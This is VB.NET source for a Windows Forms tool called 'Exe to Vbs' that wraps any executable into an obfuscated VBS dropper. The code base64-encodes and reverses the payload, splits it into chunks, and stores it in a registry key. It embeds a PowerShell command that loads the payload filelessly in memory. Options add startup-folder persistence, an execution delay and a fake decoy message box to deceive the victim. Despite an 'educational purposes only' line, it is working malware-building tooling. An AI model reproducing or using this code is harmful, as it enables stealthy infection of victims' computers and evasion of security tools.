Imports System.IO
Imports System.ComponentModel
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Threading.Tasks
Imports System.Threading
Imports System.Text
Imports Exe_to_Vbs.My
Imports System
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Windows.Forms


'│ Author       : suXjung
'│ Name         : Exe to Vbs
'│ Tel          : @sujung02 

'This program Is distributed For educational purposes only.



Public Class Form1
    Dim Messagebox_Title As String = "Tel : @sujung02"
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Control.CheckForIllegalCrossThreadCalls = False
        Me.Timer1.Enabled = True
        Me.Opacity = 0.962
    End Sub

    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles MyBase.FormClosed
        MessageBox.Show(Me, vbCrLf & "       │ Author         suXjung" &
                        vbCrLf & "       │ Name          Exe To Vbs © 22" &
                        vbCrLf & "       │ Tel              @sujung02" &
                        vbCrLf, Messagebox_Title, MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.Text = DateTime.Now.ToString("yyyy.MM.dd. | HH:mm:ss")
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim OpenFileDialog As New OpenFileDialog
        With OpenFileDialog
            .Title = ""
            .ShowDialog()
        End With
        TextBox1.Text = OpenFileDialog.FileName
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            Dim fFindFile As New System.IO.FileInfo(Me.TextBox1.Text)
            If fFindFile.Exists = False Then
                MessageBox.Show("File not exists.", Messagebox_Title, MessageBoxButtons.OK, MessageBoxIcon.Error)
            Else
                If MessageBox.Show("Reverse String?", Messagebox_Title, MessageBoxButtons.YesNo, MessageBoxIcon.Information) = DialogResult.Yes Then
                    RichTextBox1.Text = StrReverse(Convert.ToBase64String(File.ReadAllBytes(TextBox1.Text)))
                    Me.CheckBox1.Enabled = True
                    Me.CheckBox2.Enabled = True
                    Me.CheckBox3.Enabled = True
                    Me.NumericUpDown1.Enabled = True
                    Me.Button4.Enabled = True
                Else
                    RichTextBox1.Text = Convert.ToBase64String(File.ReadAllBytes(TextBox1.Text))
                    Me.CheckBox1.Enabled = True
                    Me.CheckBox2.Enabled = True
                    Me.CheckBox3.Enabled = True
                    Me.NumericUpDown1.Enabled = True
                    Me.Button4.Enabled = True
                End If
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message, Messagebox_Title, MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try

    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        RichTextBox1.SelectAll()
        RichTextBox1.Copy()
        MessageBox.Show("Copied", Messagebox_Title, MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            Me.TextBox2.Enabled = True
        ElseIf CheckBox1.Checked = False Then
            Me.TextBox2.Enabled = False
            Me.TextBox2.Text = "Payload"
        End If
    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then
            Me.Label1.Enabled = True
            Me.Label2.Enabled = True
            Me.Label3.Enabled = True
            Me.TextBox3.Enabled = True
            Me.TextBox4.Enabled = True
            Me.ComboBox1.Enabled = True
            Me.Button5.Enabled = True
            Me.Button4.Enabled = False
        ElseIf CheckBox3.Checked = False Then
            Me.Label1.Enabled = False
            Me.Label2.Enabled = False
            Me.Label3.Enabled = False
            Me.TextBox3.Enabled = False
            Me.TextBox4.Enabled = False
            Me.ComboBox1.Enabled = False
            Me.Button5.Enabled = False
            Me.Button4.Enabled = True
        End If
    End Sub

    Public Function FAKE()
        If (String.IsNullOrWhiteSpace(Me.TextBox3.Text) OrElse String.IsNullOrWhiteSpace(Me.TextBox4.Text) OrElse String.IsNullOrWhiteSpace(Me.ComboBox1.Text)) Then
            MessageBox.Show("Erorr", Messagebox_Title, MessageBoxButtons.OK, MessageBoxIcon.Information)
            Return False
        Else
            Me.Button4.Enabled = True
            Return True
        End If
    End Function

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Dim icon As MessageBoxIcon
        If FAKE() = True Then
            If Me.ComboBox1.Text = "Critical" Then
                icon = MessageBoxIcon.Error
            ElseIf Me.ComboBox1.Text = "Question" Then
                icon = MessageBoxIcon.Question
            ElseIf Me.ComboBox1.Text = "Exclamation" Then
                icon = MessageBoxIcon.Exclamation
            ElseIf Me.ComboBox1.Text = "Information" Then
                icon = MessageBoxIcon.Information
            End If
            MessageBox.Show(Me.TextBox4.Text, Me.TextBox3.Text, MessageBoxButtons.OK, icon)
        End If
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        If Me.CheckBox1.Checked AndAlso String.IsNullOrWhiteSpace(Me.TextBox2.Text) Then
            MessageBox.Show("Startup Name Error", Messagebox_Title, MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If

        Dim text As String = My.Resources.code
        Dim text2 As String = " $text = ((Get-ItemProperty HKCU:\Software\#name\).#name); $text = -join $text[-1..-$text.Length]; [AppDomain]::CurrentDomain.Load([Convert]::FromBase64String($text)).EntryPoint.Invoke($Null,$Null);"
        Dim stringBuilder As StringBuilder = New StringBuilder()
        Dim text3 As String = Strings.StrReverse(Convert.ToBase64String(File.ReadAllBytes(Me.TextBox1.Text)))
        Dim text4 As String = "A" & Path.GetRandomFileName().Replace(".", "")
        Dim text5 As String = "A" & Path.GetRandomFileName().Replace(".", "")
        Dim num As Integer = text3.Length / 4
        Dim length As Integer = text3.Length
        Dim list As List(Of String) = New List(Of String)()
        Dim i As Integer = 0

        While i < length

            If i + num > length Then
                num = length - i
            End If

            stringBuilder.Append(String.Concat(New String() {text4, i.ToString(), "=""", text3.Substring(i, num), """" & vbCrLf}))
            list.Add(text4 & i.ToString())
            i += num
        End While

        stringBuilder.Append(text5 & " = ")
        text = text.Replace("#sleep", Me.NumericUpDown1.Value.ToString()).Replace("#B64", text5).Replace("#base64", stringBuilder.Append(String.Join(" + ", list)).ToString()).Replace("#name", Me.TextBox2.Text)

        If Me.CheckBox1.Checked Then
            text = text.Replace("'#startup ", "")
            text = text.Replace("#startup", "Copy-Item '"" & currentPath & ""' '"" & startPath & ""';")
        Else
            text = text.Replace("#startup ", "")
        End If

        text2 = text2.Replace("#name", Me.TextBox2.Text)
        text = text.Replace("#PS1", Convert.ToBase64String(Encoding.Unicode.GetBytes(text2)))

        If CheckBox3.Checked = True Then
            If FAKE() = True Then
                text = text.Replace("%Remark%", "")
                text = text.Replace("%MsgBox_Msg%", Me.TextBox4.Text)
                text = text.Replace("%MsgBox_Title%", Me.TextBox3.Text)
                text = text.Replace("%MsgBox_Icon%", "vb" & Me.ComboBox1.Text)
            End If
        ElseIf CheckBox3.Checked = False Then
            text = text.Replace("%Remark%", "'")
            text = text.Replace("%MsgBox_Msg%", "")
            text = text.Replace("%MsgBox_Title%", "")
            text = text.Replace("%MsgBox_Icon%", "")
        End If

        Using saveFileDialog As SaveFileDialog = New SaveFileDialog()
            saveFileDialog.Filter = "*.vbs|*.vbs"

            If saveFileDialog.ShowDialog() = DialogResult.OK Then
                File.WriteAllText(saveFileDialog.FileName, text)
                MessageBox.Show("Complete!", Messagebox_Title, MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            End If
        End Using
    End Sub
End Class




